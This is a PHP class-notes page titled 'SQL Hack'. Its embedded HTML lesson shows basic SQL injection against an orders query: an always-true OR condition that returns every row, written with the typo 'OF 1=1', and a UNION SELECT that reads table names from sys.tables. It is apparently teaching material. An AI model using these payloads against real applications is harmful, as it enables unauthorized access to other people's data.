<?php

namespace J\ClassNotes {

  class SQL_09_Hack extends Page
  {

    /*-----------------------------------------------------------------*/
    /* TITLE <title> */
    public function getTitle() : string
    {
      return <<< 'TITLE'
Hack
TITLE;
    }

    /*-----------------------------------------------------------------*/
    /* MAIN HEADING <h1> */
    public function getMainHeading() : string
    {
      return <<< 'MAINHEADING'
SQL Hack
MAINHEADING;
    }

    /*-----------------------------------------------------------------*/
    /* CONTENT  <main> */
    public function getContent() : string
    {
      $returnValue = <<< 'CONTENT'
<h2>Hacking</h2>
<p>Many input fields simply complete a SQL statement, so you may add an OR to change the output</p>
<pre><code>
-- The original statement behind the scenes
SELECT * FROM orders WHERE id = 

-- If we add:
1234 OF 1=1
-- it will be true for every row and thus return every row
</code></pre>
<pre><code>
-- Use a UNION command to get to another table

-- The original statement behind the scenes
SELECT * FROM orders WHERE id = 

-- if we add to get the table names (match the number of columns):
1234 UNION SELECT 0, NULL, name, 0, 0 FROM sys.tables


</code></pre>


CONTENT;

      return $returnValue;
    }

  }
}